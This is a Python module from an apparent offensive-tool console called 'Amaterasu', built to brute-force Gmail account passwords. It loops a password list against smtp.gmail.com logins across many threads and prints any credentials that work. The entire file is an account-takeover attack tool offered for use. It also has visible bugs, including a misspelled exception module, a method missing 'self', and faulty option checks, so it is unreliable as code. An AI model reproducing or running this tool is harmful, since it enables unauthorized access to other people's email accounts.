#!/usr/bin/env python3
#coding: utf-8
# Amaterasu project

import argparse
import cmd2
from huepy import *
from threading import Lock
from typing import Optional, Any
import smtplib
import concurrent.futures

from lib.opt_data import *

set_parser = argparse.ArgumentParser()
set_subparsers = set_parser.add_subparsers(title='subcommands', help='subcommand help')

parser_target = set_subparsers.add_parser('TARGET', help='target help')
parser_target.add_argument('TARGET', type=str)

parser_port = set_subparsers.add_parser('PORT', help='set port to use in the bruteforce. Default: 465')
parser_port.add_argument('PORT', type=str)

parser_passwords = set_subparsers.add_parser('PASS_FILE', help='set passwords file to use to bruteforce')
parser_passwords.add_argument('PASS_FILE', type=str)

parser_verbose = set_subparsers.add_parser('VERBOSE', help='set True if you want to see what accounts failed')
parser_verbose.add_argument('VERBOSE', type=bool)

show_parser = argparse.ArgumentParser()
show_parser.add_argument('show', choices=["CONFIG"])

class GmailBruteforce(cmd2.Cmd):
	def __init__(self):
		# terminal lock
		super().__init__()

		self.target = None
		self.port = 465
		self.verbose = False
		self.passwords = None

		self.metadata = {'Description'	: 'Bruteforce Gmail accounts.',
						'Author'	 	: 'Sam Marx <sam-marx[at]protonmail.com>',
						'Version'	 	: '1.0',
		}

		Options = Opt()
		Options.new(name='TARGET', current_setting=self.target, required=True, description="Target's e-mail address.")
		Options.new(name='PORT', current_setting=self.port, required=False, description='Port to use in bruteforce attack. If not set, default port will be used.')
		Options.new(name='VERBOSE', current_setting=self.verbose, required=False, description='set True if you want to see what accounts failed.')
		Options.new(name='PASS_FILE', current_setting=self.passwords, required=True, description='Password file to use in the bruteforce.')

		self.prompt = 'amaterasu[credential_access/gmail_bruteforce]> '
		self.intro = f'{lightblue("Provided by:")}\n{self.metadata["Author"]}\n\n'
		self.intro += f'{lightblue("Description:")}\n{self.metadata["Description"]}\n\n'
		self.intro += f'{lightblue("Options:")}\n{Options.create_table()}\n'

	def show(self, args):
		'''Shows something'''
		if args.show == 'config':
			print(f'TARGET: {self.target}\nPORT: {self.port}\nPASS_FILE: {self.passwords}\nVERBOSE: {self.verbose}')

	def set_target(self, args):
		self.target = args.TARGET
		print(info(f'TARGET set: {self.target}'))

	def set_verbose(self, args):
		self.verbose = args.VERBOSE
		print(info(f'VERBOSE set: {self.verbose}'))

	def set_port(self, args):
		self.port = args.PORT
		print(info(f'PORT set: {self.port}'))

	def set_passwords(self, args):
		self.passwords = args.PASS_FILE
		print(info(f'PASS_FILE: {self.passwords}'))

	parser_target.set_defaults(func = set_target)
	parser_port.set_defaults(func = set_port)
	parser_passwords.set_defaults(func = set_passwords)
	parser_verbose.set_defaults(func = set_verbose)
	show_parser.set_defaults(func = show)

	@cmd2.with_argparser(set_parser)
	def do_set(self, args):
		'''Used to set options.'''
		func = getattr(args, 'func', None)

		if func is not None:
			func(self, args)
		else:
			self.do_help('set')

	@cmd2.with_argparser(show_parser)
	def do_show(self, args):
		''' Show [config, target etc.].'''
		func = getattr(args, 'func', None)

		if func is not None:
			func(self, args)
		else:
			self.do_help('show')

	def do_back(self, args):
		'''Goes back to Amaterasu.'''
		return True

	def do_run(self, args):
		futures = []

		try:
			if self.target is not None or self.passwords is not None:
				lock = Lock()

				passwords = open(self.passwords).readlines()

				with concurrent.futures.ThreadPoolExecutor(len(passwords) + 20) as executor:
					for password in passwords:
						executor.submit(self.bruteforce, lock, self.target, password.strip(), self.port, self.verbose)
			else:
				print(bad('You have to set a TARGET and PASS_FILE.'))
		except Exception as e:
			print(bad(f'Thread error: {e}'))

	def bruteforce(lock: Any, target: str, password: str, port: int, verbose: Optional[bool] = False) -> None:
		with lock:
			try:
				server = smtplib.SMTP_SSL('smtp.gmail.com', port)
				server.login(target, password)
				print(good(f'Username: {target}'))
				print(good(f'Password: {password}'))
			except smtlib.SMTPAuthenticationError:
				if verbose:
					print(bad(f'Username: {target}'))
					print(bad(f'Password: {password}'))
			except:
				pass
			finally:
				server.quit()